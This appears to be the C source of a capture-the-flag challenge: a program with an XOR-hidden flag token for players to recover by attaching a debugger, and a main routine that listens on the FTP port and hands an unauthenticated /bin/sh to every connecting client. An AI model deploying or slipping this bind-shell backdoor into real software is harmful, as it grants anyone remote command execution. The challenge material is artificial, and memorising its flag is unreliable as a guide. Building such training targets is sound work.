#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>

#define BIND_PORT 21

void debug_mode(void) {
    printf("Entering debug mode...\n");
    unsigned char TOKEN_KEY = 0x37;

    // PCCC{token_1_vsftp}
    unsigned char ENCODED_TOKEN[] = {
        PLACEHOLDER
    };

    size_t ENCODED_TOKEN_LEN = sizeof(ENCODED_TOKEN);
    // Local buffer to hold the decoded token (+1 for null terminator)
    char token[ENCODED_TOKEN_LEN + 1];

    for (size_t i = 0; i < ENCODED_TOKEN_LEN; i++) {
        token[i] = (char)(ENCODED_TOKEN[i] ^ TOKEN_KEY);
    }
    token[ENCODED_TOKEN_LEN] = '\0';

    // Use 'volatile' to make it harder for the compiler to optimize this away.
    //volatile char *visible_to_debugger = token;
    //(void)visible_to_debugger;

    // Keep the process alive so players have time to attach
    pause();
}

// Function to handle signal for child process termination
void sig_chld(int signo) {
    // Collect child process status to prevent zombies
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

// Function to handle the basic shell session
void handle_basic_shell(int connfd) {
    // Redirect standard I/O to the socket
    dup2(connfd, STDIN_FILENO);   // 0 (stdin)
    dup2(connfd, STDOUT_FILENO);  // 1 (stdout)
    dup2(connfd, STDERR_FILENO);  // 2 (stderr)
    
    // Execute the shell
    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    
    // If execve fails
    exit(1);
}

int main(int argc, char *argv[]) {
    // Check for debug mode argument
    if (argc > 1 && strcmp(argv[1], "--debug") == 0) {
        debug_mode();
        return 0;
    }

    int listenfd, connfd;
    struct sockaddr_in serv_addr;

    // Create listening socket
    listenfd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenfd < 0) {
        exit(1);
    }

    // Reuse address to avoid "Address already in use" errors
    int one = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(BIND_PORT);

    // Bind socket to address and port
    if (bind(listenfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        exit(1);
    }

    // Listen for incoming connections (allow a backlog of 5 connections)
    listen(listenfd, 5);

    // Set up signal handler for child termination
    signal(SIGCHLD, sig_chld);

    while (1) {
        // Accept a connection
        connfd = accept(listenfd, NULL, NULL);
        if (connfd < 0) {
            // Handle error, restart accept if interrupted by a signal
            if (errno == EINTR) continue;
            exit(1);
        }

        // Fork a new process to handle the client
        if (fork() == 0) {
            // Child process
            close(listenfd); // Child doesn't need the listening socket
            handle_basic_shell(connfd);
            // The shell process will run until the connection closes
            close(connfd);
            exit(0);
        } else {
            // Parent process
            close(connfd); // Parent closes the connection socket and continues listening
        }
    }
    return 0;
}
